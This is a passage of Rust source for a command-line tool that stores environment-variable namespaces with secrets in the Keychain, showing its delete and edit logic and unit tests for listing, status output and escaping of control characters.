    apply(ctx, changes)?;
    record_trust_after_change(ctx, &saved)
}

/// Checks a plain value given on the command line before anything is asked:
/// the secret marker and NUL are refused. Names only in the errors.
fn check_inline_plain(name: &str, value: &str) -> Result<()> {
    if value == SECRET_MARKER {
        bail!(
            "variable {name}: the plain value {SECRET_MARKER:?} is reserved for secrets; use --secret {name}"
        );
    }
    vet_plain(value.to_string()).with_context(|| format!("variable {name}"))?;
    Ok(())
}

/// Deletes namespace `ns` after confirmation.
///
/// User level: one question naming the secrets; the Keychain items go first,
/// then the file. Project level: question 1 deletes the file from the working
/// tree; then, only if the namespace has secrets, question 2 (default no)
/// asks whether to delete the Keychain items too, which every other checkout
/// and fork of the project on this machine shares. Both are asked before
/// anything is written, and a no to question 1 skips question 2. No trust
/// check: deleting is not loading. The items go before the file, so if
/// something fails midway the file is still there, still lists the secrets,
/// and running the command again finishes the job (deleting an item that is
/// already gone is fine).
///
/// Returns the names of the secrets whose Keychain items were kept (at
/// project level, when the user kept them), so the caller can say so; empty
/// otherwise.
pub fn remove(ctx: &Ctx, ns: &str) -> Result<Vec<String>> {
    let file = ctx.cfg.load(ns)?;
    let secrets: Vec<String> = file
        .vars()
        .into_iter()
        .filter_map(|(name, value)| (value == Value::Secret).then_some(name))
        .collect();
    let mut delete_items = true;
    if ctx.cfg.is_project() {
        let q1 = format!(
            "Delete project namespace {ns:?}? Its file is removed from the working tree \
             (git status may show it)."
        );
        let no_terminal = || {
            format!(
                "deleting project namespace {ns:?} needs a terminal to confirm \
                 (run envy {ns} --rm in a terminal); nothing was changed"
            )
        };
        if !ctx.prompt.confirm(&q1).with_context(no_terminal)? {
            bail!("cancelled; nothing was changed");
        }
        delete_items = !secrets.is_empty() && {
            let q2 = format!(
                "Namespace {ns:?} has {} secret(s) in the Keychain ({}). They are shared with \
                 every other checkout and fork of this project on this machine. Delete them too?",
                secrets.len(),
                secrets.join(", ")
            );
            ctx.prompt.confirm(&q2).with_context(no_terminal)?
        };
    } else {
        let question = if secrets.is_empty() {
            format!("Delete namespace {ns:?}?")
        } else {
            format!(
                "Delete namespace {ns:?} and its {} secret(s) from the Keychain ({})?",
                secrets.len(),
                secrets.join(", ")
            )
        };
        if !ctx.prompt.confirm(&question)? {
            bail!("cancelled; nothing was changed");
        }
    }
    if delete_items {
        let key = ctx.cfg.secret_key(ns);
        for name in &secrets {
            ctx.store.delete(&key, name).with_context(|| {
                format!(
                    "cannot delete secret {name} of namespace {ns:?} from the Keychain; the \
                     namespace file was kept, items before it may already be gone, and running \
                     the command again finishes the job"
                )
            })?;
        }
    }
    ctx.cfg.delete(ns)?;
    Ok(if delete_items { Vec::new() } else { secrets })
}

/// Opens namespace `ns` in an editor and saves what the user wrote, with
/// whatever that implies for the Keychain and the link group.
///
/// The editor (`run_editor`, normally [`crate::editor::launch`]) works on a
/// copy in a fresh private temporary directory (0700, file 0600), which is
/// deleted however this returns or unwinds. The copy holds no secret: those
/// appear as the `@keychain` marker. The edited text must parse as a
/// namespace file (names and the label are validated) and keep the `link`
/// label as it was; otherwise nothing is changed.
///
/// Reconciled against the file as it was:
/// - a name that is now a secret but was not (new, or plain before) is
///   prompted for, hidden;
/// - names that were secrets but no longer are (removed, or now plain) get
///   one `confirm` to delete their Keychain items; declining keeps the items
///   and still saves the file;
/// - plain values need no prompt;
/// - in a linked namespace the rest of the group is then made to match the
///   edited file ([`link::conform`]), even when nothing was edited, which
///   repairs a group that drifted through hand edits.
///
/// At project level the file's current contents must be trusted, or
/// confirmed ([`check_trust_for_change`]), before the editor is started.
/// Everything is prompted before anything is written; the writes then go
/// through [`apply`]. An unedited file is not rewritten. The resulting `ns`
/// (only) is then recorded as trusted, edited or not. Returns whether
/// anything was written (in `ns` or elsewhere in its group).
pub fn edit(ctx: &Ctx, ns: &str, run_editor: &dyn Fn(&Path) -> Result<()>) -> Result<bool> {
    validate_namespace(ns)?;
    let before = load_for_edit(ctx.cfg, ns)?;
    // Checked before the editor runs, so an unreadable member stops us early.
    link::others(ctx.cfg, &before)?;
    check_trust_for_change(ctx, &before)?;

    let dir = tempfile::Builder::new()
        .prefix("envy-edit-")
        .permissions(std::fs::Permissions::from_mode(0o700))
        .tempdir()
        .context("cannot create a private temporary directory for the editor")?;
    let copy = dir.path().join(format!("{ns}.toml"));
    write_private(&copy, &before.text())
        .context("cannot create the temporary copy for the editor")?;
    run_editor(&copy).context("the editor failed; nothing was changed")?;
    let text = std::fs::read_to_string(&copy)
        .context("cannot read the edited file back; nothing was changed")?;
    drop(dir);

    let after = NamespaceFile::parse(ns, &text)
        .context("the edited file was not saved; nothing was changed")?;
    if after.link() != before.link() {
        bail!(
            "the link label cannot be changed in the editor; use envy {ns} --link <group> or envy {ns} --unlink; nothing was changed"
        );
    }

    let was_secret = |name: &str| before.get(name) == Some(Value::Secret);
    let delete: Vec<String> = before
        .vars()
        .into_iter()
        .filter(|(name, value)| *value == Value::Secret && after.get(name) != Some(Value::Secret))
        .map(|(name, _)| name)
        .collect();
    let delete = if !delete.is_empty()
        && !ctx.prompt.confirm(&format!(
            "Delete the Keychain items for {} from {ns:?} (no longer secrets there)?",
            delete.join(", ")
        ))? {
        Vec::new()
    } else {
        delete
    };
    let mut secrets: Vec<(String, Secret)> = Vec::new();
    for (name, value) in after.vars() {
        if value == Value::Secret && !was_secret(&name) {
            let secret = ctx
                .prompt
                .secret(&secret_label(&name, &display_ns(ctx.cfg, ns)))
                .with_context(|| format!("no value for secret {name}; nothing was changed"))?;
            secrets.push((name, secret));
        }
    }
    let others = link::others(ctx.cfg, &after)?;
    let group = link::conform(ctx, &after, others.clone())?;

    // The editor and the prompts can take a while: do not overwrite a change
    // made meanwhile, to `ns` or to the rest of its group.
    if ctx.cfg.load(ns).map(|now| now.text()).ok() != Some(before.text()) {
        bail!("namespace {ns:?} was changed while envy was editing it; nothing was changed");
    }
    link::ensure_unchanged(ctx.cfg, &before, after.link(), &others)?;
    // What `ns` holds once this returns: `after` if saved, else `before`
    // (the same text). The user confirmed or edited it, so it is trusted.
    let result = after.clone();
    let mut changes: Vec<Change> = Vec::new();
    if after.text() != before.text() {
        changes.push(Change {
            file: after,
            before: Some(before),
            secrets,
            delete,
        });
    }
    changes.extend(group);
    let wrote = !changes.is_empty();
    if wrote {
        apply(ctx, changes)?;
    }
    record_trust_after_change(ctx, &result)?;
    Ok(wrote)
}

/// Loads `ns` for editing. A file that does not parse cannot be reconciled
/// (there is no old state to compare against), so it is refused with its
/// path, for the user to repair by hand.
fn load_for_edit(cfg: &Config, ns: &str) -> Result<NamespaceFile> {
    match cfg.load(ns) {
        Ok(file) => Ok(file),
        Err(e) if cfg.exists(ns).unwrap_or(false) => Err(e.context(format!(
            "cannot edit {}: envy needs the current file to compare against, so fix it by hand first",
            encode_path(&cfg.dir().join(format!("{ns}.toml")))
        ))),
        Err(e) => Err(e),
    }
}

/// Creates `path` (which must not exist) with mode 0600 and writes `text`.
fn write_private(path: &Path, text: &str) -> std::io::Result<()> {
    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(path)?;
    f.write_all(text.as_bytes())?;
    f.sync_all()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::display::is_invisible_or_control;
    use crate::levels::Levels;
    use crate::project::encode_path;
    use crate::prompt::{Asked, ScriptedPrompter};
    use crate::store::MemoryStore;

    fn config_with(files: &[(&str, &str)]) -> (tempfile::TempDir, Config) {
        let dir = tempfile::tempdir().unwrap();
        for (name, text) in files {
            std::fs::write(dir.path().join(format!("{name}.toml")), text).unwrap();
        }
        let cfg = Config::new(dir.path().to_path_buf());
        (dir, cfg)
    }

    /// The levels of a run outside any project: the user level only.
    fn user_levels(cfg: &Config) -> Levels {
        Levels::user_only(cfg.clone())
    }

    /// A temp home with a user level and two nested project levels:
    /// `home/a/.envy` (ci, dev) and `home/a/b/.envy` (dev, web); the user
    /// level has dev and mine. Returns the levels seen from `home/a/b`.
    fn nested_levels() -> (tempfile::TempDir, std::path::PathBuf, Levels) {
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let home = base.join("home");
        let user = base.join("user");
        for (dir, names) in [
            (home.join("a/.envy"), &["ci", "dev"][..]),
            (home.join("a/b/.envy"), &["dev", "web"]),
            (user.clone(), &["dev", "mine"]),
        ] {
            std::fs::create_dir_all(&dir).unwrap();
            for n in names {
                std::fs::write(dir.join(format!("{n}.toml")), "[vars]\nA = \"1\"\n").unwrap();
            }
        }
        let levels = Levels::discover(&home.join("a/b"), &home, Config::new(user)).unwrap();
        (tmp, home, levels)
    }

    /// `ns` active, loaded from the level labelled `source` (`None`: a
    /// shell from before `ENVY_SOURCE` existed).
    fn act(ns: &str, source: Option<&str>) -> ActiveState {
        ActiveState::single(ns, source, &["A"])
    }

    /// The nested listing with `marks` (one char per row, in order: inner
    /// dev, inner web, outer ci, outer dev, user dev, user mine).
    fn nested_body(home: &Path, marks: &str) -> String {
        let m: Vec<char> = marks.chars().collect();
        assert_eq!(m.len(), 6);
        format!(
            "project: {}\n{} dev\n{} web\nproject: {}\n{} ci\n{} dev (shadowed)\n\
             user:\n{} dev (shadowed)\n{} mine\n",
            encode_path(&home.join("a/b/.envy")),
            m[0],
            m[1],
            encode_path(&home.join("a/.envy")),
            m[2],
            m[3],
            m[4],
            m[5],
        )
    }

    #[test]
    fn status_lists_every_level_nearest_first_and_marks_shadowed() {
        let (_tmp, home, levels) = nested_levels();
        let inner = encode_path(&home.join("a/b/.envy"));
        let outer = encode_path(&home.join("a/.envy"));
        let st = |a: &ActiveState| status(&levels, a).unwrap();
        assert_eq!(st(&ActiveState::default()), nested_body(&home, "      "));
        // The star goes on the row of the level the namespace was loaded from,
        // shadowed or not.
        assert_eq!(st(&act("dev", Some(&inner))), nested_body(&home, "*     "));
        assert_eq!(st(&act("dev", Some(&outer))), nested_body(&home, "   *  "));
        assert_eq!(st(&act("dev", Some("user"))), nested_body(&home, "    * "));
        assert_eq!(st(&act("mine", Some("user"))), nested_body(&home, "     *"));
        assert_eq!(st(&act("ci", Some(&outer))), nested_body(&home, "  *   "));
        // The right name at the wrong level is not the active one.
        assert_eq!(
            st(&act("mine", Some(&inner))),
            format!(
                "{}* mine (no longer exists)\n",
                nested_body(&home, "      ")
            )
        );
        assert_eq!(
            st(&act("gone", Some("user"))),
            format!(
                "{}* gone (no longer exists)\n",
                nested_body(&home, "      ")
            )
        );
        assert_eq!(
            st(&act("dev", Some("/elsewhere/.envy"))),
            format!(
                "{}* dev (from another folder)\n",
                nested_body(&home, "      ")
            )
        );
    }

    #[test]
    fn status_from_a_shell_without_envy_source_marks_only_an_unambiguous_name() {
        let (_tmp, home, levels) = nested_levels();
        let st = |a: &ActiveState| status(&levels, a).unwrap();
        // `dev` is at three levels: which one was loaded is unknown.
        assert_eq!(st(&act("dev", None)), nested_body(&home, "      "));
        assert_eq!(st(&act("web", None)), nested_body(&home, " *    "));
        assert_eq!(st(&act("mine", None)), nested_body(&home, "     *"));
        assert_eq!(
            st(&act("gone", None)),
            format!(
                "{}* gone (no longer exists)\n",
                nested_body(&home, "      ")
            )
        );
        // Outside any project: today's output.
        let user = Levels::user_only(levels.user().clone());
        assert_eq!(status(&user, &act("dev", None)).unwrap(), "* dev\n  mine\n");
    }

    /// The four cases a reviewer reproduced, in a repository with a project
    /// `dev` and `web` and a user `dev` and `mine`.
    #[test]
    fn the_marker_follows_the_level_that_was_loaded() {
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let home = base.join("home");
        let user = base.join("user");
        let repo = home.join("repo");
        for (dir, names) in [
            (repo.join(".envy"), &["dev", "web"][..]),
            (user.clone(), &["dev", "mine"]),
        ] {
            std::fs::create_dir_all(&dir).unwrap();
            for n in names {
                std::fs::write(dir.join(format!("{n}.toml")), "[vars]\nA = \"1\"\n").unwrap();
            }
        }
        let in_repo = Levels::discover(&repo, &home, Config::new(user.clone())).unwrap();
        let at_home = Levels::discover(&home, &home, Config::new(user.clone())).unwrap();
        let label = encode_path(&repo.join(".envy"));

        // 1. `envy dev --user` in the repository: the user row is starred.
        let mine = act("dev", Some("user"));
        assert_eq!(
            status(&in_repo, &mine).unwrap(),
            format!("project: {label}\n  dev\n  web\nuser:\n* dev (shadowed)\n  mine\n")
        );
        // 2. ... and only `--list --user` says active.
        assert_eq!(
            list_vars(&in_repo, "dev", true, &mine).unwrap(),
            "namespace: dev (active)\nsource: user\n\nA  \"1\"\n"
        );
        assert_eq!(
            list_vars(&in_repo, "dev", false, &mine).unwrap(),
            format!("namespace: dev\nsource: project ({label}/dev.toml)\n\nA  \"1\"\n")
        );
        // 3. The project's `dev` loaded, then `cd ~`: not the user's `dev`.
        let theirs = act("dev", Some(&label));
        assert_eq!(
            status(&at_home, &theirs).unwrap(),
            "  dev\n  mine\n* dev (from another folder)\n"
        );
        assert_eq!(
            list_vars(&at_home, "dev", false, &theirs).unwrap(),
            "namespace: dev\nsource: user\n\nA  \"1\"\n"
        );
        // 4. A project-only `web` seen from home still exists.
        assert_eq!(
            status(&at_home, &act("web", Some(&label))).unwrap(),
            "  dev\n  mine\n* web (from another folder)\n"
        );
        // Back in the repository it is starred where it lives.
        assert_eq!(
            status(&in_repo, &act("web", Some(&label))).unwrap(),
            format!("project: {label}\n  dev\n* web\nuser:\n  dev (shadowed)\n  mine\n")
        );
        // Its file deleted: gone, not elsewhere.
        std::fs::remove_file(repo.join(".envy/web.toml")).unwrap();
        assert_eq!(
            status(&in_repo, &act("web", Some(&label))).unwrap(),
            format!(
                "project: {label}\n  dev\nuser:\n  dev (shadowed)\n  mine\n* web (no longer exists)\n"
            )
        );
    }

    #[test]
    fn list_vars_from_an_old_shell_says_active_only_when_unambiguous() {
        let (_tmp, _home, levels) = nested_levels();
        let out = list_vars(&levels, "dev", false, &act("dev", None)).unwrap();
        assert!(out.starts_with("namespace: dev\n"), "{out}");
        let out = list_vars(&levels, "web", false, &act("web", None)).unwrap();
        assert!(out.starts_with("namespace: web (active)\n"), "{out}");
    }

    #[test]
    fn status_shows_an_empty_level_and_keeps_the_empty_state_line() {
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let home = base.join("home");
        let user = base.join("user");
        std::fs::create_dir_all(home.join("p/.envy")).unwrap();
        std::fs::create_dir_all(&user).unwrap();
        let levels = Levels::discover(&home.join("p"), &home, Config::new(user.clone())).unwrap();
        // Nothing anywhere: today's line.
        assert_eq!(
            status(&levels, &ActiveState::default()).unwrap(),
            "no namespaces yet; create one with: envy <name> --new\n"
        );
        std::fs::write(user.join("mine.toml"), "").unwrap();
        let envy = encode_path(&home.join("p/.envy"));
        assert_eq!(
            status(&levels, &ActiveState::default()).unwrap(),
            format!("project: {envy}\n  (no namespaces)\nuser:\n  mine\n")
        );
    }

    #[test]
    fn status_header_escapes_the_project_path() {
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let home = base.join("home");
        let user = base.join("user");
        let proj = home.join("evil\u{1b}[31m\nname");
        std::fs::create_dir_all(proj.join(".envy")).unwrap();
        std::fs::create_dir_all(&user).unwrap();
        std::fs::write(proj.join(".envy/dev.toml"), "").unwrap();
        let levels = Levels::discover(&proj, &home, Config::new(user)).unwrap();
        let out = status(&levels, &ActiveState::default()).unwrap();
        assert!(out.contains("evil%1B%5B31m%0Aname/.envy\n"), "{out}");
        assert!(!out.chars().any(|c| c.is_control() && c != '\n'), "{out}");
        assert_eq!(out.lines().count(), 4, "{out}");
    }

    #[test]
    fn list_vars_shows_the_source_line() {
        let (_tmp, home, levels) = nested_levels();
        let file = encode_path(&home.join("a/b/.envy/dev.toml"));
        assert_eq!(
            list_vars(
                &levels,
                "dev",
                false,
                &act("dev", Some(&encode_path(&home.join("a/b/.envy"))))
            )
            .unwrap(),
            format!("namespace: dev (active)\nsource: project ({file})\n\nA  \"1\"\n")
        );
        // The outer level's own name, found walking up.
        let ci = encode_path(&home.join("a/.envy/ci.toml"));
        assert_eq!(
            list_vars(&levels, "ci", false, &ActiveState::default()).unwrap(),
            format!("namespace: ci\nsource: project ({ci})\n\nA  \"1\"\n")
        );
        // --user skips the project levels.
        assert_eq!(
            list_vars(&levels, "dev", true, &ActiveState::default()).unwrap(),
            "namespace: dev\nsource: user\n\nA  \"1\"\n"
        );
        assert!(list_vars(&levels, "ci", true, &ActiveState::default()).is_err());
    }

    #[test]
    fn list_vars_of_a_corrupt_project_file_fails_closed() {
        let (_tmp, home, levels) = nested_levels();
        std::fs::write(home.join("a/b/.envy/dev.toml"), "not [toml").unwrap();
        let err = format!(
            "{:#}",
            list_vars(&levels, "dev", false, &ActiveState::default()).unwrap_err()
        );
        assert!(err.contains("invalid TOML"), "{err}");
    }

    #[test]
    fn status_lists_names_and_marks_active_and_never_values() {
        let (_dir, cfg) = config_with(&[
            (
                "work",
                "[vars]\nA = \"plain-value-123\"\nB = \"@keychain\"\n",
            ),
            ("personal", "[vars]\nC = \"other-value-456\"\n"),
        ]);
        let active = ActiveState::single("work", Some("user"), &["A", "B"]);
        let out = status(&user_levels(&cfg), &active).unwrap();
        assert_eq!(out, "  personal\n* work\n");
        assert!(!out.contains("value"));
    }

    fn rows(text: &str) -> Vec<&str> {
        text.lines().collect()
    }

    #[test]
    fn list_vars_shows_plain_values_in_file_order() {
        let (_dir, cfg) = config_with(&[(
            "dev",
            "[vars]\nAWS_REGION = \"eu-west-1\"\nLOG = \"debug\"\n",
        )]);
        let out = list_vars(&user_levels(&cfg), "dev", false, &ActiveState::default()).unwrap();
        assert_eq!(
            out,
            "namespace: dev\nsource: user\n\nAWS_REGION  \"eu-west-1\"\nLOG         \"debug\"\n"
        );
    }

    #[test]
    fn list_vars_shows_secrets_without_a_value_and_needs_no_store() {
        let (_dir, cfg) = config_with(&[(
            "dev",
            "[vars]\nTOKEN = \"@keychain\"\nREGION = \"eu\"\nB = \"@keychain\"\n",
        )]);
        // `list_vars` takes only a Config and an ActiveState: there is no
        // store to read from, by construction.
        let out = list_vars(&user_levels(&cfg), "dev", false, &ActiveState::default()).unwrap();
        assert_eq!(
            out,
            "namespace: dev\nsource: user\n\nTOKEN   @keychain\nREGION  \"eu\"\nB       @keychain\n"
        );
    }

    #[test]
    fn list_vars_shows_the_link_group() {
        let (_dir, cfg) = config_with(&[("dev", "link = \"aws\"\n[vars]\nA = \"1\"\n")]);
        let out = list_vars(&user_levels(&cfg), "dev", false, &ActiveState::default()).unwrap();
        assert_eq!(out, "namespace: dev\nsource: user\nlink: aws\n\nA  \"1\"\n");
    }

    #[test]
    fn list_vars_marks_the_active_namespace_only() {
        let (_dir, cfg) = config_with(&[
            ("dev", "link = \"aws\"\n[vars]\nA = \"1\"\n"),
            ("prod", "[vars]\nA = \"2\"\n"),
        ]);
        let active = ActiveState::single("dev", Some("user"), &["A"]);
        assert_eq!(
            list_vars(&user_levels(&cfg), "dev", false, &active).unwrap(),
            "namespace: dev (active)\nsource: user\nlink: aws\n\nA  \"1\"\n"
        );
        assert_eq!(
            list_vars(&user_levels(&cfg), "prod", false, &active).unwrap(),
            "namespace: prod\nsource: user\n\nA  \"2\"\n"
        );
    }

    #[test]
    fn list_vars_on_an_empty_namespace_says_so() {
        let (_dir, cfg) = config_with(&[("dev", ""), ("lk", "link = \"g\"\n")]);
        assert_eq!(
            list_vars(&user_levels(&cfg), "dev", false, &ActiveState::default()).unwrap(),
            "namespace: dev\nsource: user\n\n(no variables)\n"
        );
        assert_eq!(
            list_vars(&user_levels(&cfg), "lk", false, &ActiveState::default()).unwrap(),
            "namespace: lk\nsource: user\nlink: g\n\n(no variables)\n"
        );
    }

    #[test]
    fn list_vars_escapes_control_characters_in_plain_values() {
        let (_dir, cfg) = config_with(&[(
            "dev",
            "[vars]\nA = \"x\\ny\\u001b[31mred\\tt \\\"q\\\" back\\\\slash caf\u{e9} \u{65e5}\u{672c}\\u007f\\u202e\\r\"\nE = \"\"\nB = \"ok\"\n",
        )]);
        let out = list_vars(&user_levels(&cfg), "dev", false, &ActiveState::default()).unwrap();
        assert_eq!(
            out,
            "namespace: dev\nsource: user\n\n\
             A  \"x\\ny\\u{1b}[31mred\\tt \\\"q\\\" back\\\\slash caf\u{e9} \u{65e5}\u{672c}\\u{7f}\\u{202e}\\r\"\n\
             E  \"\"\n\
             B  \"ok\"\n"
        );
        // One row per variable, and no raw control character anywhere.
        assert_eq!(rows(&out).len(), 6);
        assert!(!out.chars().any(|c| c.is_control() && c != '\n'));
    }

    #[test]
    fn invisible_and_control_characters_are_escaped_at_each_range_edge() {
        let ranges: &[(u32, u32)] = &[
            (0x00, 0x1f),
            (0x7f, 0x9f),
            (0xad, 0xad),
            (0x34f, 0x34f),
            (0x61c, 0x61c),
            (0x115f, 0x1160),
            (0x17b4, 0x17b5),
            (0x180b, 0x180f),
            (0x200b, 0x200f),
            (0x2028, 0x202e),
            (0x2060, 0x206f),
            (0x3164, 0x3164),
            (0xfe00, 0xfe0f),
            (0xfeff, 0xfeff),
            (0xffa0, 0xffa0),
            (0xfff0, 0xfffb),
            (0x1bca0, 0x1bca3),
            (0x1d173, 0x1d17a),
            (0xe0000, 0xe0fff),
        ];
        for &(first, last) in ranges {
            for cp in [first, last] {
                let c = char::from_u32(cp).unwrap();
                assert!(is_invisible_or_control(c), "U+{cp:04X} not flagged");
                if !matches!(c, '\n' | '\r' | '\t') {
                    assert_eq!(
                        quote_for_display(&c.to_string()),
                        format!("\"\\u{{{cp:x}}}\""),
                        "U+{cp:04X}"
                    );
                }
            }
        }
        // Ordinary text, combining marks, CJK and emoji bodies pass through.
        for text in [
            "caf\u{e9}",
            "e\u{301}",
            "\u{ac}\u{ae}\u{34e}\u{350}\u{61b}\u{61d}\u{3163}\u{3165}\u{ffa1}",
            "\u{65e5}\u{672c}\u{8a9e}",
            "\u{1f980}\u{1f600}",
        ] {
            assert_eq!(quote_for_display(text), format!("\"{text}\""), "{text:?}");
        }
    }

    #[test]
    fn list_vars_escapes_tag_and_other_invisible_characters() {
        let (_dir, cfg) = config_with(&[(
            "dev",
            "[vars]\nA = \"a\\U000E0041b\\u061c\\u00ad\\ufe0f\"\n",
        )]);
        let out = list_vars(&user_levels(&cfg), "dev", false, &ActiveState::default()).unwrap();
        assert_eq!(
            out,
            "namespace: dev\nsource: user\n\nA  \"a\\u{e0041}b\\u{61c}\\u{ad}\\u{fe0f}\"\n"
        );
    }

    #[test]
    fn list_vars_unknown_namespace_gives_the_new_hint() {
        let (_dir, cfg) = config_with(&[]);
        let err =
            list_vars(&user_levels(&cfg), "nope", false, &ActiveState::default()).unwrap_err();
        assert_eq!(
            format!("{err:#}"),
            "namespace \"nope\" does not exist (use --new to create it)"
        );
        assert!(list_vars(&user_levels(&cfg), "../x", false, &ActiveState::default()).is_err());
    }

    #[test]
    fn list_vars_corrupt_file_names_the_file_but_not_its_contents() {
        let (_dir, cfg) = config_with(&[("dev", "[vars\nA = \"zq-secretish\"\n")]);
        let err = list_vars(&user_levels(&cfg), "dev", false, &ActiveState::default()).unwrap_err();
        let msg = format!("{err:#} {err:?}");
        assert!(
            msg.contains("\"dev\"") && msg.contains("invalid TOML"),
            "{msg}"
        );
        assert!(!msg.contains("zq-secretish"), "{msg}");
    }

    #[test]
    fn status_without_active_marks_nothing_and_handles_empty_dir() {
        let (_dir, cfg) = config_with(&[("work", "")]);
        assert_eq!(
            status(&user_levels(&cfg), &ActiveState::default()).unwrap(),
            "  work\n"
        );
        let (_dir, empty) = config_with(&[]);
        let out = status(&user_levels(&empty), &ActiveState::default()).unwrap();
        assert!(out.contains("--new"), "{out}");
    }

    #[test]
    fn status_flags_active_namespace_that_no_longer_exists() {
        let (_dir, cfg) = config_with(&[("work", "")]);
        let active = ActiveState::single("gone", Some("user"), &[]);
        assert_eq!(
            status(&user_levels(&cfg), &active).unwrap(),
            "  work\n* gone (no longer exists)\n"
        );
    }

    #[test]
    fn activate_loads_and_renders() {
        let (_dir, cfg) = config_with(&[("work", "[vars]\nA = \"x\"\nB = \"@keychain\"\n")]);
        let store = MemoryStore::default();
        store.set("work", "B", &Secret::new("s".into())).unwrap();
        let prompt = ScriptedPrompter::new();
        let out = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "work",
            &ActiveState::default(),
        )
        .unwrap();
        assert_eq!(
            out,
            "export ENVY_ACTIVE='work'\nexport ENVY_STACK='work\u{1f}user\u{1f}A B'\nexport ENVY_VARS='A B'\nunset ENVY_SOURCE\nexport A='x'\nexport B='s'\n"
        );
    }

    #[test]
    fn activate_unknown_namespace_names_it_and_mentions_new() {
        let (_dir, cfg) = config_with(&[]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let err = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "nope",
            &ActiveState::default(),
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("nope") && msg.contains("--new"), "{msg}");
    }

    fn read(dir: &tempfile::TempDir, name: &str) -> String {
        std::fs::read_to_string(dir.path().join(format!("{name}.toml"))).unwrap()
    }

    fn file_names(dir: &tempfile::TempDir) -> Vec<String> {
        let mut v: Vec<String> = std::fs::read_dir(dir.path())
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        v.sort();
        v
    }

    fn snap(store: &MemoryStore) -> Vec<(String, String, String)> {
        store.snapshot()
    }

    fn entry(ns: &str, name: &str, value: &str) -> (String, String, String) {
        (ns.into(), name.into(), value.into())
    }

    /// `--secret NAME`.
    fn sec(name: &str) -> SetItem {
        SetItem::secret(name)
    }

    /// `--plain NAME` (prompted).
    fn pl(name: &str) -> SetItem {
        SetItem::plain(name, None)
    }

    /// `--plain NAME=value` (no prompt).
    fn pv(name: &str, value: &str) -> SetItem {
        SetItem::plain(name, Some(value))
    }

    const SOURCE: &str =
        "link = \"aws\"\n\n[vars]\nAWS_REGION = \"eu-west-1\"\nTOKEN = \"@keychain\"\n";

    #[test]
    fn create_empty_writes_file_and_errors_if_it_exists() {
        let (dir, cfg) = config_with(&[]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        create(&ctx, "work", None, None).unwrap();
        assert_eq!(read(&dir, "work"), "");
        assert!(snap(&store).is_empty());
        let err = create(&ctx, "work", None, None).unwrap_err().to_string();
        assert!(err.contains("already exists"), "{err}");
        assert_eq!(read(&dir, "work"), "");
    }

    #[test]
    fn create_rejects_invalid_name_without_touching_disk() {
        let (dir, cfg) = config_with(&[]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(create(&ctx, "../evil", None, None).is_err());
        assert!(file_names(&dir).is_empty());
    }

    #[test]
    fn create_like_copies_names_and_plain_values_and_prompts_each_secret() {
        let (dir, cfg) = config_with(&[("src", SOURCE)]);
        let store = MemoryStore::default();
        store
            .set("src", "TOKEN", &Secret::new("source-token".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_secret("new-token");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).unwrap();
        assert_eq!(
            read(&dir, "dst"),
            "[vars]\nAWS_REGION = \"eu-west-1\"\nTOKEN = \"@keychain\"\n"
        );
        assert!(!read(&dir, "dst").contains("link"));
        assert_eq!(
            snap(&store),
            vec![
                entry("dst", "TOKEN", "new-token"),
                entry("src", "TOKEN", "source-token")
            ]
        );
        assert_eq!(read(&dir, "src"), SOURCE);
        assert_eq!(
            prompt.asked(),
            vec![Asked::Secret("Secret value for TOKEN in dst".into())]
        );
        assert_eq!(prompt.remaining(), 0);
    }

    #[test]
    fn create_like_self_at_the_same_level_errors_and_creates_nothing() {
        let (dir, cfg) = config_with(&[("w", SOURCE)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let source = cfg.load("w").unwrap();
        let err = create(&ctx, "w", Some((&cfg, &source)), None)
            .unwrap_err()
            .to_string();
        assert!(err.contains("already exists"), "{err}");
        assert_eq!(read(&dir, "w"), SOURCE);
        assert_eq!(file_names(&dir), vec!["w.toml"]);
        assert!(snap(&store).is_empty());
        assert!(prompt.asked().is_empty());
    }

    #[test]
    fn create_like_failed_second_prompt_writes_nothing() {
        let src = "[vars]\nA = \"@keychain\"\nB = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("src", src)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_secret("a-value")
            .with_secret("");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).is_err());
        assert_eq!(file_names(&dir), vec!["src.toml"]);
        assert!(snap(&store).is_empty());
    }

    /// A store whose `set` fails for one variable name.
    struct FailingSet {
        inner: MemoryStore,
        fail_on: &'static str,
    }

    impl SecretStore for FailingSet {
        fn get(&self, ns: &str, name: &str) -> Result<Option<Secret>> {
            self.inner.get(ns, name)
        }
        fn contains(&self, ns: &str, name: &str) -> Result<bool> {
            self.inner.contains(ns, name)
        }
        fn set(&self, ns: &str, name: &str, value: &Secret) -> Result<()> {
            if name == self.fail_on {
                bail!("simulated Keychain failure");
            }
            self.inner.set(ns, name, value)
        }
        fn delete(&self, ns: &str, name: &str) -> Result<()> {
            self.inner.delete(ns, name)
        }
    }

    #[test]
